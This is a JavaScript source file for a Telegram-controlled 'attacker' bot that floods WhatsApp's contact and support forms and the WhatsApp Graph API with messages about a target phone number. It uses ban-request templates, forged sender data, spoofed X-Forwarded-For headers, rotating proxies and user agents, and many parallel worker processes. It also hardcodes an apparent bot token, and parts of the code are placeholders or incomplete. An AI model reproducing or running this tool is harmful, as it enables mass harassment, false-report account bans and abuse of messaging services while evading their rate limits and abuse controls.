const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { randomInt } = require('crypto');
const fs = require('fs');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const bot = new TelegramBot(TOKEN, { polling: true });
const TARGET_URLS = [
    "https://www.whatsapp.com/contact/",
    "https://www.whatsapp.com/support/",
    "https://www.whatsapp.com/help/",
    "https://www.whatsapp.com/contact/noclient",
    "https://www.whatsapp.com/business/",
    "https://www.whatsapp.com/",
    "https://www.whatsapp.com/",
    "https://graph.facebook.com/v17.0/{phone-number-id}/messages" // Added Facebook Graph API URL
];

const USER_AGENTS = require('./user_agents.json'); // Large list of 1000+ user agents
const PROXIES = require('./proxies.json'); // Rotating proxy list

// Message Templates
const MESSAGE_TEMPLATES = {
    BAN: 'message_ban_whatsapp.json',
    UNBAN: 'message_unban_whatsapp.json',
    SPAM: 'message_spam_whatsapp.json'
};

// Global Attack Stats
const attackStats = {
    isRunning: false,
    requests: 0,
    successes: 0,
    mode: 'SPAM',
    startTime: 0,
    workers: [],
    phoneNumberId: '' // Added to store phone number ID for WhatsApp API
};

// Load Message Templates with Cache
const messageCache = {};
function loadMessages(mode) {
    if (messageCache[mode]) return messageCache[mode];
    
    try {
        const rawData = fs.readFileSync(MESSAGE_TEMPLATES[mode], 'utf8');
        messageCache[mode] = JSON.parse(rawData);
        return messageCache[mode];
    } catch (err) {
        console.error(`Error loading ${mode} messages:`, err);
        return null;
    }
}

function generateNuclearData(targetNumber, mode) {
    const messages = loadMessages(mode);
    const randomMessage = messages[randomInt(0, messages.length)];
    return {
        country: ['ID', 'US', 'IN', 'BR', 'NG', 'PK', 'BD', 'MX', 'DE', 'RU'][randomInt(0, 10)],
        email: `${generateRandomString(12)}@${['gmail.com','yahoo.com','hotmail.com','proton.me'][randomInt(0,4)]}`,
        phone: `+${randomInt(1, 99)}${randomInt(100000000, 9999999999)}`,
        platform: ['ANDROID','IPHONE','WEB','KAIOS','DESKTOP'][randomInt(0,5)],
        subject: randomMessage.subject.replace(/\[NUMBER\]/g, targetNumber),
        message: randomMessage.body.replace(/\[NUMBER\]/g, targetNumber),
        token: generateRandomString(64),
        csrf: generateRandomString(32)
    };
}

function generateRandomString(length) {
    return Array.from({length}, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[randomInt(0, 36)]).join('');
}

// WhatsApp API function
async function sendWhatsAppMessage(phoneNumberId, targetNumber, message) {
    try {
        const url = `https://graph.facebook.com/v17.0/${phoneNumberId}/messages`;
        const data = {
            messaging_product: "whatsapp",
            to: targetNumber,
            type: "text",
            text: { body: message }
        };

        const headers = {
            "Authorization": `Bearer ${process.env.WHATSAPP_TOKEN}`,
            "Content-Type": "application/json"
        };

        const response = await axios.post(url, data, { headers });
        
        // Handle successful response
        if (response.data.messages && response.data.messages[0].status === "sent") {
            return {
                success: true,
                messageId: response.data.messages[0].id
            };
        }
        
        // Handle error response
        if (response.data.error) {
            return {
                success: false,
                error: response.data.error
            };
        }
        
    } catch (error) {
        return {
            success: false,
            error: error.response ? error.response.data : error.message
        };
    }
}

// Cluster Worker Execution
if (cluster.isMaster) {
    console.log(`💣 MASTER PROCESS READY (${numCPUs} WORKERS)`);
    
    // Telegram Bot Commands
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, 
            ` *LORDHOZOO ATTACKER 2025* \n\n` +
            `💣 UNLIMITED MESSAGE SPAMMING\n` +
            `🚀 MULTI-THREADED ATTACKS\n` +
            `🔥 AUTO PROXY ROTATION\n` +
            `📱 WHATSAPP API INTEGRATION\n\n` +
            `📌 COMMANDS:\n` +
            `/spam +628123456789 - Start unlimited spam\n` +
            `/ban +628123456789 - Start ban attack\n` +
            `/unban +628123456789 - Start unban attack\n` +
            `/whatsapp +628123456789 - Send WhatsApp message\n` +
            `/stop - Terminate all attacks\n` +
            `/stats - Show current stats`,
            { parse_mode: 'Markdown' }
        );
    });

    // Add new WhatsApp command
    bot.onText(/\/whatsapp (.+)/, async (msg, match) => {
        if (!attackStats.phoneNumberId) {
            bot.sendMessage(msg.chat.id, '⚠️ Please set phone number ID first using /setphoneid');
            return;
        }
        
        const targetNumber = match[1];
        const message = "This is an automated WhatsApp message from the attack bot";
        
        const result = await sendWhatsAppMessage(attackStats.phoneNumberId, targetNumber, message);
        
        if (result.success) {
            bot.sendMessage(msg.chat.id, `✅ WhatsApp message sent successfully!\nMessage ID: ${result.messageId}`);
        } else {
            bot.sendMessage(msg.chat.id, `❌ Failed to send WhatsApp message:\n${JSON.stringify(result.error, null, 2)}`);
        }
    });

    // Add command to set phone number ID
    bot.onText(/\/setphoneid (.+)/, (msg, match) => {
        attackStats.phoneNumberId = match[1];
        bot.sendMessage(msg.chat.id, `✅ WhatsApp Phone Number ID set to: ${attackStats.phoneNumberId}`);
    });

    // ... [rest of your existing master process code remains the same]

} else {
    // Worker process - modified to include WhatsApp API attacks
    console.log(`⚡ WORKER ${process.pid} READY`);
    
    const attack = async () => {
        let workerRequests = 0;
        let workerSuccesses = 0;
        
        while (attackStats.isRunning) {
            try {
                // Randomly choose between website attack or WhatsApp API attack
                const attackType = randomInt(0, 100) < 30 ? 'WHATSAPP_API' : 'WEBSITE'; // 30% chance to use WhatsApp API
                
                if (attackType === 'WHATSAPP_API' && attackStats.phoneNumberId) {
                    // WhatsApp API attack
                    const targetNumber = attackStats.target;
                    const messages = loadMessages(attackStats.mode);
                    const randomMessage = messages[randomInt(0, messages.length)];
                    const message = randomMessage.body.replace(/\[NUMBER\]/g, targetNumber);
                    
                    const result = await sendWhatsAppMessage(attackStats.phoneNumberId, targetNumber, message);
                    
                    workerRequests++;
                    if (result.success) {
                        workerSuccesses++;
                    }
                } else {
                    // Original website attack
                    const targetUrl = TARGET_URLS[randomInt(0, TARGET_URLS.length - 1)]; // Exclude WhatsApp API URL
                    const data = generateNuclearData(attackStats.target, attackStats.mode);
                    
                    const formData = new URLSearchParams();
                    formData.append('country_selector', data.country);
                    formData.append('email', data.email);
                    formData.append('phone_number', data.phone);
                    formData.append('platform', data.platform);
                    formData.append('your_message', `${data.subject}%0A${data.message}`);
                    formData.append('__csr', data.csrf);
                    formData.append('__ccg', 'EXCELLENT');
                    
                    const headers = {
                        "User-Agent": USER_AGENTS[randomInt(0, USER_AGENTS.length)],
                        "X-Forwarded-For": `${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`,
                        "Accept-Language": "en-US,en;q=0.9",
                        "Content-Type": "application/x-www-form-urlencoded"
                    };
                    
                    const proxy = PROXIES[randomInt(0, PROXIES.length)];
                    const axiosConfig = {
                        headers,
                        timeout: 5000,
                        proxy: {
                            host: proxy.ip,
                            port: proxy.port,
                            auth: proxy.auth
                        }
                    };
                    
                    const response = await axios.post(targetUrl, formData, axiosConfig);
                    
                    workerRequests++;
                    if (response.status === 200) {
                        workerSuccesses++;
                    }
                }
                
                // Send stats update to master every 100 requests
                if (workerRequests % 100 === 0) {
                    process.send({
                        type: 'stats',
                        requests: workerRequests,
                        successes: workerSuccesses
                    });
                    workerRequests = 0;
                    workerSuccesses = 0;
                }
                
                // Minimal delay for maximum throughput
                await new Promise(resolve => setTimeout(resolve, 50));
                
            } catch (error) {
                // Silently continue the attack
                workerRequests++;
            }
        }
    };
    
    attack();
}

console.log(' 👰 HOZOO IMUT SPAM BOT ACTIVATED');
